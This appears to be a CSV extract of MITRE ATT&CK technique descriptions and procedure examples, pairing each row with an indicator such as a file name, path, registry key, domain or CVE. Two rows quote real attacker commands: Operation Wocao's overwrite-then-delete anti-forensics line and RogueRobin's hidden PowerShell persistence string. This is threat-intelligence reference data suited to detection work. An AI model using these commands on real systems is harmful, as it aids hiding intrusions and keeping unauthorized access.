T1070.004,File Deletion,"During  Operation Wocao , the threat actors consistently removed traces of their activity by first overwriting a file using  /c cd /d c:\windows\temp\ &amp; copy \\&lt;IP ADDRESS&gt;\c$\windows\system32\devmgr.dll \\&lt;IP ADDRESS&gt;\c$\windows\temp\LMAKSW.ps1 /y  and then deleting the overwritten file using  /c cd /d c:\windows\temp\ &amp; del \\&lt;IP ADDRESS&gt;\c$\windows\temp\LMAKSW.ps1 .   [165]",Procedure Examples,file,devmgr.dll
T1070.004,File Deletion,Pillowmint  has deleted the filepath  %APPDATA%\Intel\devmonsrv.exe .   [173],Procedure Examples,file,devmonsrv.exe
T1070.004,File Deletion,Saint Bot  can run a batch script named  del.bat  to remove any  Saint Bot  payload-linked files from a compromise system if anti-analysis or locale checks fail.   [168],Procedure Examples,file,del.bat
T1070.004,File Deletion,Some  Sakula  samples use cmd.exe to delete temporary files.   [204],Procedure Examples,file,cmd.exe
T1547.008,LSASS Driver,"Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.   [1]      Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g.,  Hijack Execution Flow ), an adversary can use LSA operations to continuously execute malicious payloads.",Description,file,lsass.exe
T1547.008,LSASS Driver,"Wingbird  drops a malicious file (sspisrv.dll) alongside a copy of lsass.exe, which is used to register a service that loads sspisrv.dll as a driver. The payload of the malicious driver (located in its entry-point function) is executed when loaded by lsass.exe before the spoofed service becomes unstable and crashes.   [3]      [4]",Procedure Examples,file,sspisrv.dll
T1547.008,LSASS Driver,"Wingbird  drops a malicious file (sspisrv.dll) alongside a copy of lsass.exe, which is used to register a service that loads sspisrv.dll as a driver. The payload of the malicious driver (located in its entry-point function) is executed when loaded by lsass.exe before the spoofed service becomes unstable and crashes.   [3]      [4]",Procedure Examples,file,lsass.exe
T1059.005,Visual Basic,SideCopy  has sent Microsoft Office Publisher documents to victims that have embedded malicious macros that execute an hta file via calling  mshta.exe .   [142],Procedure Examples,file,mshta.exe
T1059.001,PowerShell,"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.   [1]    Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the  Start-Process  cmdlet which can be used to run an executable and the  Invoke-Command  cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).   PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.   A number of PowerShell-based offensive testing tools are available, including  Empire ,   PowerSploit ,  PoshC2 , and PSAttack.   [2]      PowerShell commands/scripts can also be executed without directly invoking the  powershell.exe  binary through interfaces to PowerShell's underlying  System.Management.Automation  assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).   [3]      [4]      [5]",Description,file,powershell.exe
T1059.001,PowerShell,Cobalt Group  has used powershell.exe to download and execute scripts.   [46]      [47]      [48]      [49]      [50]      [51],Procedure Examples,file,powershell.exe
T1059.001,PowerShell,PowerLess  is written in and executed via PowerShell without using powershell.exe.   [172],Procedure Examples,file,powershell.exe
T1059.001,PowerShell,"RogueRobin  uses a command prompt to run a PowerShell script from Excel.   [66]    To assist in establishing persistence,  RogueRobin  creates  %APPDATA%\OneDrive.bat  and saves the following string to it: powershell.exe -WindowStyle Hidden -exec bypass -File ""%APPDATA%\OneDrive.ps1"" .   [195]      [66]",Procedure Examples,file,OneDrive.bat
T1059.001,PowerShell,"RogueRobin  uses a command prompt to run a PowerShell script from Excel.   [66]    To assist in establishing persistence,  RogueRobin  creates  %APPDATA%\OneDrive.bat  and saves the following string to it: powershell.exe -WindowStyle Hidden -exec bypass -File ""%APPDATA%\OneDrive.ps1"" .   [195]      [66]",Procedure Examples,file,powershell.exe
T1098.004,SSH Authorized Keys,Earth Lusca  has dropped an SSH-authorized key in the  /root/.ssh  folder in order to access a compromised server with SSH.   [8],Procedure Examples,path,/root/.ssh
T1546.003,Windows Management Instrumentation Event Subscription,"Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime.   [1]      Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.   [2]      [3]    Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.   [4]      [5]      WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",Description,file,WmiPrvSe.exe
T1546.003,Windows Management Instrumentation Event Subscription,Blue Mockingbird  has used mofcomp.exe to establish WMI Event Subscription persistence mechanisms configured from a *.mof file.   [12],Procedure Examples,file,mofcomp.exe
T1546.002,Screensaver,"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.   [1]    The Windows screensaver application scrnsave.scr is located in  C:\Windows\System32\ , and  C:\Windows\sysWOW64\   on 64-bit Windows systems, along with screensavers included with base Windows installations.   The following screensaver settings are stored in the Registry ( HKCU\Control Panel\Desktop\ ) and could be manipulated to achieve persistence:   Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.   [2]",Description,registry-key,HKCU\Control Panel\Desktop
T1546.002,Screensaver,"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.   [1]    The Windows screensaver application scrnsave.scr is located in  C:\Windows\System32\ , and  C:\Windows\sysWOW64\   on 64-bit Windows systems, along with screensavers included with base Windows installations.   The following screensaver settings are stored in the Registry ( HKCU\Control Panel\Desktop\ ) and could be manipulated to achieve persistence:   Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.   [2]",Description,registry-key,HKCU\Control
T1546.002,Screensaver,"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.   [1]    The Windows screensaver application scrnsave.scr is located in  C:\Windows\System32\ , and  C:\Windows\sysWOW64\   on 64-bit Windows systems, along with screensavers included with base Windows installations.   The following screensaver settings are stored in the Registry ( HKCU\Control Panel\Desktop\ ) and could be manipulated to achieve persistence:   Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.   [2]",Description,file,scrnsave.scr
T1546.002,Screensaver,"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.   [1]    The Windows screensaver application scrnsave.scr is located in  C:\Windows\System32\ , and  C:\Windows\sysWOW64\   on 64-bit Windows systems, along with screensavers included with base Windows installations.   The following screensaver settings are stored in the Registry ( HKCU\Control Panel\Desktop\ ) and could be manipulated to achieve persistence:   Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.   [2]",Description,path,C:\Windows\System32
T1546.002,Screensaver,"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.   [1]    The Windows screensaver application scrnsave.scr is located in  C:\Windows\System32\ , and  C:\Windows\sysWOW64\   on 64-bit Windows systems, along with screensavers included with base Windows installations.   The following screensaver settings are stored in the Registry ( HKCU\Control Panel\Desktop\ ) and could be manipulated to achieve persistence:   Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.   [2]",Description,path,C:\Windows\sysWOW64
T1552.003,Bash History,"Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the ""history"" utility. Once a user logs out, the history is flushed to the user’s  .bash_history  file. For each user, this file resides at the same location:  ~/.bash_history . Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials.    [1]",Description,path,~/.bash
T1105,Ingress Tool Transfer,Cobalt Group  has used public sites such as github.com and sendspace.com to upload files and then download them to victim computers.   [106]      [1]    The group's JavaScript backdoor is also capable of downloading files.   [107],Procedure Examples,domain,sendspace.com
T1105,Ingress Tool Transfer,Cobalt Group  has used public sites such as github.com and sendspace.com to upload files and then download them to victim computers.   [106]      [1]    The group's JavaScript backdoor is also capable of downloading files.   [107],Procedure Examples,domain,github.com
T1105,Ingress Tool Transfer,Diavol  can receive configuration updates and additional payloads including wscpy.exe from C2.   [135],Procedure Examples,file,wscpy.exe
T1105,Ingress Tool Transfer,"GALLIUM  dropped additional tools to victims during their operation, including portqry.exe, a renamed cmd.exe file, winrar, and  HTRAN .   [180]      [68]",Procedure Examples,file,portqry.exe
T1105,Ingress Tool Transfer,"GALLIUM  dropped additional tools to victims during their operation, including portqry.exe, a renamed cmd.exe file, winrar, and  HTRAN .   [180]      [68]",Procedure Examples,file,cmd.exe
T1105,Ingress Tool Transfer,Moses Staff  has downloaded and installed web shells to following path  C:\inetpub\wwwroot\aspnet_client\system_web\IISpool.aspx .   [289],Procedure Examples,path,C:\inetpub\wwwroot\aspnet_client\system_web\IISpool.aspx
T1105,Ingress Tool Transfer,Winnti Group  has downloaded an auxiliary program named ff.exe to infected machines.   [464],Procedure Examples,file,ff.exe
T1055,Process Injection,ABK  has the ability to inject shellcode into svchost.exe.   [1],Procedure Examples,file,svchost.exe
T1055,Process Injection,APT32  malware has injected a Cobalt Strike beacon into Rundll32.exe.   [3],Procedure Examples,file,Rundll32.exe
T1055,Process Injection,"APT37  injects its malware variant,  ROKRAT , into the cmd.exe process.   [4]",Procedure Examples,file,cmd.exe
T1055,Process Injection,APT41  malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore.exe process.   [5],Procedure Examples,file,iexplore.exe
T1055,Process Injection,Avenger  has the ability to inject shellcode into svchost.exe.   [1],Procedure Examples,file,svchost.exe
T1055,Process Injection,Backdoor.Oldrea  injects itself into explorer.exe.   [8]      [9],Procedure Examples,file,explorer.exe
T1055,Process Injection,BBK  has the ability to inject shellcode into svchost.exe.   [1],Procedure Examples,file,svchost.exe
T1055,Process Injection,Clambling  can inject into the  svchost.exe  process for execution.   [13],Procedure Examples,file,svchost.exe
T1055,Process Injection,Egregor  can inject its payload into iexplore.exe process.   [21],Procedure Examples,file,iexplore.exe
T1055,Process Injection,JPIN  can inject content into lsass.exe to load a module.   [34],Procedure Examples,file,lsass.exe
T1055,Process Injection,Kimsuky  has used Win7Elevate to inject malicious code into explorer.exe.   [35],Procedure Examples,file,explorer.exe
T1055,Process Injection,"Mis-Type  has been injected directly into a running process, including  explorer.exe .   [37]",Procedure Examples,file,explorer.exe
T1055,Process Injection,"NETWIRE  can inject code into system processes including notepad.exe, svchost.exe, and vbc.exe.   [39]",Procedure Examples,file,notepad.exe
T1055,Process Injection,"NETWIRE  can inject code into system processes including notepad.exe, svchost.exe, and vbc.exe.   [39]",Procedure Examples,file,svchost.exe
T1055,Process Injection,"NETWIRE  can inject code into system processes including notepad.exe, svchost.exe, and vbc.exe.   [39]",Procedure Examples,file,vbc.exe
T1055,Process Injection,The  PcShare  payload has been injected into the  logagent.exe  and  rdpclip.exe  processes.   [43],Procedure Examples,file,logagent.exe
T1055,Process Injection,The  PcShare  payload has been injected into the  logagent.exe  and  rdpclip.exe  processes.   [43],Procedure Examples,file,rdpclip.exe
T1055,Process Injection,"QakBot  can inject itself into processes including explore.exe, Iexplore.exe, and Mobsync.exe.   [45]      [46]      [47]      [48]",Procedure Examples,file,explore.exe
T1055,Process Injection,"QakBot  can inject itself into processes including explore.exe, Iexplore.exe, and Mobsync.exe.   [45]      [46]      [47]      [48]",Procedure Examples,file,Iexplore.exe
T1055,Process Injection,"QakBot  can inject itself into processes including explore.exe, Iexplore.exe, and Mobsync.exe.   [45]      [46]      [47]      [48]",Procedure Examples,file,Mobsync.exe
T1055,Process Injection,"ROKRAT  can use  VirtualAlloc ,  WriteProcessMemory , and then  CreateRemoteThread  to execute shellcode within the address space of  Notepad.exe .   [51]",Procedure Examples,file,Notepad.exe
T1055,Process Injection,Silence  has injected a DLL library containing a Trojan into the fwmain32.exe process.   [54],Procedure Examples,file,fwmain32.exe
T1055,Process Injection,SILENTTRINITY  can inject shellcode directly into Excel.exe or a specific process.   [55],Procedure Examples,file,Excel.exe
T1055,Process Injection,TrickBot  has used  Nt*   Native API  functions to inject code into legitimate processes such as  wermgr.exe .   [61],Procedure Examples,file,wermgr.exe
T1055,Process Injection,"TSCookie  has the ability to inject code into the svchost.exe, iexplorer.exe, explorer.exe, and default browser processes.   [62]",Procedure Examples,file,svchost.exe
T1055,Process Injection,"TSCookie  has the ability to inject code into the svchost.exe, iexplorer.exe, explorer.exe, and default browser processes.   [62]",Procedure Examples,file,iexplorer.exe
T1055,Process Injection,"TSCookie  has the ability to inject code into the svchost.exe, iexplorer.exe, explorer.exe, and default browser processes.   [62]",Procedure Examples,file,explorer.exe
T1203,Exploitation for Client Execution,"admin@338  has exploited client software vulnerabilities for execution, such as Microsoft Word CVE-2012-0158.   [1]",Procedure Examples,cve,CVE-2012-0158
T1203,Exploitation for Client Execution,Agent Tesla  has exploited Office vulnerabilities such as CVE-2017-11882 and CVE-2017-8570 for execution during delivery.   [2],Procedure Examples,cve,CVE-2017-11882
T1203,Exploitation for Client Execution,Agent Tesla  has exploited Office vulnerabilities such as CVE-2017-11882 and CVE-2017-8570 for execution during delivery.   [2],Procedure Examples,cve,CVE-2017-8570
T1203,Exploitation for Client Execution,Aoqin Dragon  has exploited CVE-2012-0158 and CVE-2010-3333 for execution against targeted systems.   [6],Procedure Examples,cve,CVE-2012-0158
T1203,Exploitation for Client Execution,Aoqin Dragon  has exploited CVE-2012-0158 and CVE-2010-3333 for execution against targeted systems.   [6],Procedure Examples,cve,CVE-2010-3333
T1203,Exploitation for Client Execution,"APT12  has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities (CVE-2009-3129, CVE-2012-0158) and vulnerabilities in Adobe Reader and Flash (CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, CVE-2011-0611).   [7]      [8]",Procedure Examples,cve,CVE-2011-0609
T1203,Exploitation for Client Execution,"APT12  has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities (CVE-2009-3129, CVE-2012-0158) and vulnerabilities in Adobe Reader and Flash (CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, CVE-2011-0611).   [7]      [8]",Procedure Examples,cve,CVE-2009-4324
T1203,Exploitation for Client Execution,"APT12  has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities (CVE-2009-3129, CVE-2012-0158) and vulnerabilities in Adobe Reader and Flash (CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, CVE-2011-0611).   [7]      [8]",Procedure Examples,cve,CVE-2009-3129
T1203,Exploitation for Client Execution,"APT12  has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities (CVE-2009-3129, CVE-2012-0158) and vulnerabilities in Adobe Reader and Flash (CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, CVE-2011-0611).   [7]      [8]",Procedure Examples,cve,CVE-2011-0611
T1203,Exploitation for Client Execution,"APT12  has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities (CVE-2009-3129, CVE-2012-0158) and vulnerabilities in Adobe Reader and Flash (CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, CVE-2011-0611).   [7]      [8]",Procedure Examples,cve,CVE-2012-0158
T1203,Exploitation for Client Execution,"APT12  has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities (CVE-2009-3129, CVE-2012-0158) and vulnerabilities in Adobe Reader and Flash (CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, CVE-2011-0611).   [7]      [8]",Procedure Examples,cve,CVE-2009-0927
T1203,Exploitation for Client Execution,APT28  has exploited Microsoft Office vulnerability CVE-2017-0262 for execution.   [9],Procedure Examples,cve,CVE-2017-0262
T1203,Exploitation for Client Execution,APT3  has exploited the Adobe Flash Player vulnerability CVE-2015-3113 and Internet Explorer vulnerability CVE-2014-1776.   [13]      [14],Procedure Examples,cve,CVE-2014-1776
T1203,Exploitation for Client Execution,APT3  has exploited the Adobe Flash Player vulnerability CVE-2015-3113 and Internet Explorer vulnerability CVE-2014-1776.   [13]      [14],Procedure Examples,cve,CVE-2015-3113
T1203,Exploitation for Client Execution,APT32  has used RTF document that includes an exploit to execute malicious code. (CVE-2017-11882)   [15],Procedure Examples,cve,CVE-2017-11882
T1203,Exploitation for Client Execution,"APT33  has attempted to exploit a known vulnerability in WinRAR (CVE-2018-20250), and attempted to gain remote code execution via a security bypass vulnerability (CVE-2017-11774).   [16]      [17]",Procedure Examples,cve,CVE-2017-11774
T1203,Exploitation for Client Execution,"APT33  has attempted to exploit a known vulnerability in WinRAR (CVE-2018-20250), and attempted to gain remote code execution via a security bypass vulnerability (CVE-2017-11774).   [16]      [17]",Procedure Examples,cve,CVE-2018-20250
T1203,Exploitation for Client Execution,"APT37  has used exploits for Flash Player (CVE-2016-4117, CVE-2018-4878), Word (CVE-2017-0199), Internet Explorer (CVE-2020-1380 and CVE-2020-26411), and Microsoft Edge (CVE-2021-26411) for execution.   [18]      [19]      [20]      [21]",Procedure Examples,cve,CVE-2016-4117
T1203,Exploitation for Client Execution,"APT37  has used exploits for Flash Player (CVE-2016-4117, CVE-2018-4878), Word (CVE-2017-0199), Internet Explorer (CVE-2020-1380 and CVE-2020-26411), and Microsoft Edge (CVE-2021-26411) for execution.   [18]      [19]      [20]      [21]",Procedure Examples,cve,CVE-2018-4878
T1203,Exploitation for Client Execution,"APT37  has used exploits for Flash Player (CVE-2016-4117, CVE-2018-4878), Word (CVE-2017-0199), Internet Explorer (CVE-2020-1380 and CVE-2020-26411), and Microsoft Edge (CVE-2021-26411) for execution.   [18]      [19]      [20]      [21]",Procedure Examples,cve,CVE-2020-26411
T1203,Exploitation for Client Execution,"APT37  has used exploits for Flash Player (CVE-2016-4117, CVE-2018-4878), Word (CVE-2017-0199), Internet Explorer (CVE-2020-1380 and CVE-2020-26411), and Microsoft Edge (CVE-2021-26411) for execution.   [18]      [19]      [20]      [21]",Procedure Examples,cve,CVE-2020-1380
T1203,Exploitation for Client Execution,"APT37  has used exploits for Flash Player (CVE-2016-4117, CVE-2018-4878), Word (CVE-2017-0199), Internet Explorer (CVE-2020-1380 and CVE-2020-26411), and Microsoft Edge (CVE-2021-26411) for execution.   [18]      [19]      [20]      [21]",Procedure Examples,cve,CVE-2021-26411
T1203,Exploitation for Client Execution,"APT37  has used exploits for Flash Player (CVE-2016-4117, CVE-2018-4878), Word (CVE-2017-0199), Internet Explorer (CVE-2020-1380 and CVE-2020-26411), and Microsoft Edge (CVE-2021-26411) for execution.   [18]      [19]      [20]      [21]",Procedure Examples,cve,CVE-2017-0199
T1203,Exploitation for Client Execution,"APT41  leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396.   [22]",Procedure Examples,cve,CVE-2015-1641
T1203,Exploitation for Client Execution,"APT41  leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396.   [22]",Procedure Examples,cve,CVE-2019-3396
T1203,Exploitation for Client Execution,"APT41  leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396.   [22]",Procedure Examples,cve,CVE-2012-0158
T1203,Exploitation for Client Execution,"APT41  leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396.   [22]",Procedure Examples,cve,CVE-2017-0199
T1203,Exploitation for Client Execution,"APT41  leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396.   [22]",Procedure Examples,cve,CVE-2017-11882
T1203,Exploitation for Client Execution,"Axiom  has used exploits for multiple vulnerabilities including CVE-2014-0322, CVE-2012-4792, CVE-2012-1889, and CVE-2013-3893.   [23]",Procedure Examples,cve,CVE-2012-4792
T1203,Exploitation for Client Execution,"Axiom  has used exploits for multiple vulnerabilities including CVE-2014-0322, CVE-2012-4792, CVE-2012-1889, and CVE-2013-3893.   [23]",Procedure Examples,cve,CVE-2013-3893
T1203,Exploitation for Client Execution,"Axiom  has used exploits for multiple vulnerabilities including CVE-2014-0322, CVE-2012-4792, CVE-2012-1889, and CVE-2013-3893.   [23]",Procedure Examples,cve,CVE-2012-1889
T1203,Exploitation for Client Execution,"Axiom  has used exploits for multiple vulnerabilities including CVE-2014-0322, CVE-2012-4792, CVE-2012-1889, and CVE-2013-3893.   [23]",Procedure Examples,cve,CVE-2014-0322
T1203,Exploitation for Client Execution,"BITTER  has exploited Microsoft Office vulnerabilities CVE-2012-0158, CVE-2017-11882, CVE-2018-0798, and CVE-2018-0802.   [25]      [26]",Procedure Examples,cve,CVE-2012-0158
T1203,Exploitation for Client Execution,"BITTER  has exploited Microsoft Office vulnerabilities CVE-2012-0158, CVE-2017-11882, CVE-2018-0798, and CVE-2018-0802.   [25]      [26]",Procedure Examples,cve,CVE-2018-0802
T1203,Exploitation for Client Execution,"BITTER  has exploited Microsoft Office vulnerabilities CVE-2012-0158, CVE-2017-11882, CVE-2018-0798, and CVE-2018-0802.   [25]      [26]",Procedure Examples,cve,CVE-2017-11882
T1203,Exploitation for Client Execution,"BITTER  has exploited Microsoft Office vulnerabilities CVE-2012-0158, CVE-2017-11882, CVE-2018-0798, and CVE-2018-0802.   [25]      [26]",Procedure Examples,cve,CVE-2018-0798
T1203,Exploitation for Client Execution,"BlackTech  has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities CVE-2012-0158, CVE-2014-6352, CVE-2017-0199, and Adobe Flash CVE-2015-5119.   [27]",Procedure Examples,cve,CVE-2012-0158
T1203,Exploitation for Client Execution,"BlackTech  has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities CVE-2012-0158, CVE-2014-6352, CVE-2017-0199, and Adobe Flash CVE-2015-5119.   [27]",Procedure Examples,cve,CVE-2017-0199
T1203,Exploitation for Client Execution,"BlackTech  has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities CVE-2012-0158, CVE-2014-6352, CVE-2017-0199, and Adobe Flash CVE-2015-5119.   [27]",Procedure Examples,cve,CVE-2015-5119
T1203,Exploitation for Client Execution,"BlackTech  has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities CVE-2012-0158, CVE-2014-6352, CVE-2017-0199, and Adobe Flash CVE-2015-5119.   [27]",Procedure Examples,cve,CVE-2014-6352
T1203,Exploitation for Client Execution,"BRONZE BUTLER  has exploited Microsoft Office vulnerabilities CVE-2014-4114, CVE-2018-0802, and CVE-2018-0798 for execution.   [28]      [29]",Procedure Examples,cve,CVE-2018-0802
T1203,Exploitation for Client Execution,"BRONZE BUTLER  has exploited Microsoft Office vulnerabilities CVE-2014-4114, CVE-2018-0802, and CVE-2018-0798 for execution.   [28]      [29]",Procedure Examples,cve,CVE-2018-0798
T1203,Exploitation for Client Execution,"BRONZE BUTLER  has exploited Microsoft Office vulnerabilities CVE-2014-4114, CVE-2018-0802, and CVE-2018-0798 for execution.   [28]      [29]",Procedure Examples,cve,CVE-2014-4114
T1203,Exploitation for Client Execution,"Cobalt Group  had exploited multiple vulnerabilities for execution, including Microsoft’s Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759.   [30]      [31]      [32]      [33]      [34]      [35]      [36]      [37]",Procedure Examples,cve,CVE-2018-8174
T1203,Exploitation for Client Execution,"Cobalt Group  had exploited multiple vulnerabilities for execution, including Microsoft’s Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759.   [30]      [31]      [32]      [33]      [34]      [35]      [36]      [37]",Procedure Examples,cve,CVE-2017-8759
T1203,Exploitation for Client Execution,"Cobalt Group  had exploited multiple vulnerabilities for execution, including Microsoft’s Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759.   [30]      [31]      [32]      [33]      [34]      [35]      [36]      [37]",Procedure Examples,cve,CVE-2017-11882
T1203,Exploitation for Client Execution,"Cobalt Group  had exploited multiple vulnerabilities for execution, including Microsoft’s Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759.   [30]      [31]      [32]      [33]      [34]      [35]      [36]      [37]",Procedure Examples,cve,CVE-2017-0199
T1203,Exploitation for Client Execution,"Cobalt Group  had exploited multiple vulnerabilities for execution, including Microsoft’s Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759.   [30]      [31]      [32]      [33]      [34]      [35]      [36]      [37]",Procedure Examples,cve,CVE-2017-8570
T1203,Exploitation for Client Execution,"Cobalt Strike  can exploit Oracle Java vulnerabilities for execution, including CVE-2011-3544, CVE-2013-2465, CVE-2012-4681, and CVE-2013-2460.   [38]      [39]",Procedure Examples,cve,CVE-2013-2460
T1203,Exploitation for Client Execution,"Cobalt Strike  can exploit Oracle Java vulnerabilities for execution, including CVE-2011-3544, CVE-2013-2465, CVE-2012-4681, and CVE-2013-2460.   [38]      [39]",Procedure Examples,cve,CVE-2012-4681
T1203,Exploitation for Client Execution,"Cobalt Strike  can exploit Oracle Java vulnerabilities for execution, including CVE-2011-3544, CVE-2013-2465, CVE-2012-4681, and CVE-2013-2460.   [38]      [39]",Procedure Examples,cve,CVE-2011-3544
T1203,Exploitation for Client Execution,"Cobalt Strike  can exploit Oracle Java vulnerabilities for execution, including CVE-2011-3544, CVE-2013-2465, CVE-2012-4681, and CVE-2013-2460.   [38]      [39]",Procedure Examples,cve,CVE-2013-2465
T1203,Exploitation for Client Execution,"Confucius  has exploited Microsoft Office vulnerabilities, including CVE-2015-1641, CVE-2017-11882, and CVE-2018-0802.   [40]      [41]",Procedure Examples,cve,CVE-2017-11882
T1203,Exploitation for Client Execution,"Confucius  has exploited Microsoft Office vulnerabilities, including CVE-2015-1641, CVE-2017-11882, and CVE-2018-0802.   [40]      [41]",Procedure Examples,cve,CVE-2018-0802
T1203,Exploitation for Client Execution,"Confucius  has exploited Microsoft Office vulnerabilities, including CVE-2015-1641, CVE-2017-11882, and CVE-2018-0802.   [40]      [41]",Procedure Examples,cve,CVE-2015-1641
T1203,Exploitation for Client Execution,Darkhotel  has exploited Adobe Flash vulnerability CVE-2015-8651 for execution.   [42],Procedure Examples,cve,CVE-2015-8651
T1203,Exploitation for Client Execution,Dragonfly  has exploited CVE-2011-0611 in Adobe Flash Player to gain execution on a targeted system.   [44],Procedure Examples,cve,CVE-2011-0611
T1203,Exploitation for Client Execution,Ember Bear  has exploited Microsoft Office vulnerability CVE-2017-11882.   [46],Procedure Examples,cve,CVE-2017-11882
T1203,Exploitation for Client Execution,"EvilBunny  has exploited CVE-2011-4369, a vulnerability in the PRC component in Adobe Reader.   [47]",Procedure Examples,cve,CVE-2011-4369
T1203,Exploitation for Client Execution,EXOTIC LILY  has used malicious documents containing exploits for CVE-2021-40444 affecting Microsoft MSHTML.   [48],Procedure Examples,cve,CVE-2021-40444
T1203,Exploitation for Client Execution,"During  Frankenstein , the threat actors exploited CVE-2017-11882 to execute code on the victim's machine.   [49]",Procedure Examples,cve,CVE-2017-11882
T1203,Exploitation for Client Execution,HAWKBALL  has exploited Microsoft Office vulnerabilities CVE-2017-11882 and CVE-2018-0802 to deliver the payload.   [50],Procedure Examples,cve,CVE-2017-11882
T1203,Exploitation for Client Execution,HAWKBALL  has exploited Microsoft Office vulnerabilities CVE-2017-11882 and CVE-2018-0802 to deliver the payload.   [50],Procedure Examples,cve,CVE-2018-0802
T1203,Exploitation for Client Execution,Higaisa  has exploited CVE-2018-0798 for execution.   [51],Procedure Examples,cve,CVE-2018-0798
T1203,Exploitation for Client Execution,"Inception  has exploited CVE-2012-0158, CVE-2014-1761, CVE-2017-11882 and CVE-2018-0802 for execution.   [52]      [53]      [54]      [55]",Procedure Examples,cve,CVE-2012-0158
T1203,Exploitation for Client Execution,"Inception  has exploited CVE-2012-0158, CVE-2014-1761, CVE-2017-11882 and CVE-2018-0802 for execution.   [52]      [53]      [54]      [55]",Procedure Examples,cve,CVE-2014-1761
T1203,Exploitation for Client Execution,"Inception  has exploited CVE-2012-0158, CVE-2014-1761, CVE-2017-11882 and CVE-2018-0802 for execution.   [52]      [53]      [54]      [55]",Procedure Examples,cve,CVE-2017-11882
T1203,Exploitation for Client Execution,"Inception  has exploited CVE-2012-0158, CVE-2014-1761, CVE-2017-11882 and CVE-2018-0802 for execution.   [52]      [53]      [54]      [55]",Procedure Examples,cve,CVE-2018-0802
T1203,Exploitation for Client Execution,InvisiMole  has installed legitimate but vulnerable Total Video Player software and wdigest.dll library drivers on compromised hosts to exploit stack overflow and input validation vulnerabilities for code execution.   [56],Procedure Examples,file,wdigest.dll
